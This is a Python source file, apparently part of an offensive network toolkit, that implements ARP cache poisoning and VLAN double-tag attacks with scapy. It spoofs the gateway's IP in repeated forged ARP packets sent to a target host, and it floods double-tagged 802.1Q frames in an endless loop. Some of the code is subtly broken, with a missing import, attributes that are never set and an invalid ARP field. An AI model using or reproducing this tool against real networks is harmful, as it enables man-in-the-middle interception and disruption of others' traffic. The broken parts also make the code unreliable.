import sys
from pathlib import Path
from scapy.all import ARP, Ether, Dot1Q, srp, srloop, sendp, RandNum

import netifaces as n

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from variables.ether.gateway  import NetInfo
from variables.ether.mac      import my_mac, gateway_mac, target_mac as get_mac
from variables.utils.signals  import install_sigint_handler

from rich.console import Console

console = Console()


class ARPPoison:

    def __init__(self, router_ip=None, router_mac=None, ifaces=None,
                 target_ip=None, target_mac=None, source_mac=None):
        self.router_ip      = router_ip  or NetInfo.get("gateway")
        self.router_mac     = router_mac or gateway_mac
        self.ifaces         = ifaces     or n.interfaces()
        self.target_ip      = target_ip
        self.target_mac     = target_mac or (get_mac(target_ip) if target_ip else None)
        self.source_mac     = source_mac or my_mac
        self.response:list  = []
        self.active         = False
        self.inactive       = False
        self.stop           = install_sigint_handler(console)
        self.stop_requested = False


    # ── ARP cache poison ──────────────────────────────────────────────────────

    def cache_poison(self, target_ip=None):
        self.active   = True
        self.inactive = False

        try:
            # Resolve MACs/IPs once before entering the loop
            if self.target_ip and self.target_mac is None:
                self.target_mac = get_mac(self.target_ip)
            if self.router_ip is None:
                self.router_ip = NetInfo.get("gateway")
            if self.router_mac is None:
                self.router_mac = gateway_mac

            # Wait for dashboard to deliver interface selection
            while not self.input_ready and not self.stop_requested:
                time.sleep(0.1)

            if self.stop_requested:
                self.active = False
                self.inactive = True
                return

            selected_iface   = self.selected_iface
            self.input_ready = False                   # reset for next run

            while self.active and not self.stop_requested:
                try:
                    pkt = (Ether(dst=self.target_mac) /
                        ARP(iface=selected_iface,
                            psrc=self.router_ip,
                            pdst=self.target_ip))
                    answered, _ = srloop(pkt, inter=RandNum(10, 40), count=20)
                    for _, received in answered:
                        self.response.append(f"Response: {received.summary()}")
                except Exception as e:
                    self.response.append(f"Packet error: {e}")
                    break

        except KeyboardInterrupt:
            pass

        self.active   = False
        self.inactive = True


    # ── VLAN double-tag poison ────────────────────────────────────────────────

    def vlan_poison(self, target_ip=None):
        if target_ip:
            self.target_ip = target_ip
        if self.target_ip is None:
            self.target_ip = input("Enter target IP: ")

        target_mac = get_mac(self.target_ip)
        pkt = (Ether(dst=target_mac) /
               Dot1Q(vlan=1) / Dot1Q(vlan=2) /
               ARP(op="who-has", psrc=self.router_ip, pdst=self.target_ip))
        sendp(pkt, inter=RandNum(10, 40), loop=1)


arp_p       = ARPPoison()
arp_poison  = arp_p.cache_poison
vlan_poison = arp_p.vlan_poison